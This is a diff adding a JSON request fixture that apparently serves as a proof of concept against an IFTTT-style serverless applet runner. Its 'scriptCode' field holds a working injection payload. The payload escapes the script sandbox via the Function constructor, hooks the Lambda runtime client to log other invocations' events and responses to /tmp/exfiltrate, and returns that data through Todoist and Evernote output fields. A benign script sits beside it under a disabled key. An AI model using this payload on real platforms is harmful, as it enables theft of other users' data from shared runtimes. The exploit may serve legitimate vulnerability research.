@@ -1,0 +1,32 @@
+{
+  "resource": "/IFTTT-instance",
+  "path": "/IFTTT-instance",
+  "httpMethod": "POST",
+  "body": {
+    "-scriptCode": "todoist.create_task.setProjectId('95602'); todoist.create_task.setTaskContent('Task content'); todoist.create_task.setNote('Note'); todoist.create_task.setDueDate(''); todoist.create_task.setPriority('4'); todoist.create_task.setTaskDescription('This is a task from evernote'); evernote.create_note.setTitle('todois task'); evernote.create_note.setBody('task content'); evernote.create_note.setNotebook(''); evernote.create_note.setTags('#todoist');",
+    "scriptCode":"var payload=`let fs=require('fs');if(typeof counter==='undefined'){counter=0;origin=todoist.create_task.setTaskContent;let rapid=require('/var/runtime/RAPIDClient.js'),_postInvocationResponse=rapid.prototype.postInvocationResponse,_nextInvocation=rapid.prototype.nextInvocation;function postInvocationResponse(response,id,callback){fs.appendFileSync('/tmp/exfiltrate',JSON.stringify({origin:origin,counter:counter,response:response===undefined?null:response,id:id}));return _postInvocationResponse.call(this,response,id,callback);}async function nextInvocation(){let result=await _nextInvocation.call(this);fs.appendFileSync('/tmp/exfiltrate',JSON.stringify({origin:origin,counter:counter,result:result}));return result;}rapid.prototype.postInvocationResponse=postInvocationResponse;rapid.prototype.nextInvocation=nextInvocation;fs.appendFileSync('/tmp/exfiltrate','Injection successful');}else{counter++;}let result=todoist.create_task.setTaskContent+' '+counter+' trigger time:'+Meta.triggerTime;if(fs.existsSync('/tmp/exfiltrate')){result+=fs.readFileSync('/tmp/exfiltrate').toString();}return result;`;var f=(()=>{}).constructor.call(null,'require','todoist','evernote','Meta',payload);var result=f(require,todoist,evernote,Meta);todoist.create_task.setTaskContent(result);evernote.create_note.setBody(result);",
+    "config": {
+      "currentTime": "2025-02-22T11:42:47.000Z",
+      "timeZone": "GMT",
+      "triggerTime": "2025-02-22T11:42:47.000Z",
+      "trigger": {
+        "serviceName": "trigger",
+        "name": "Trigger",
+        "ingredients": "{}"
+      },
+      "actions": [
+        {
+          "serviceName": "todoist",
+          "name": "create_task",
+          "fields": ["ProjectId", "TaskContent", "Note", "DueDate", "Priority", "TaskDescription"]
+        },
+        {
+          "serviceName": "evernote",
+          "name": "create_note",
+          "fields": ["Title", "Body", "Notebook", "Tags"]
+        }
+      ],
+      "link": "https://ifttt.com/applets/wZNtTHJQ-sync-evernote-and-todoist"
+    }
+  }
+}
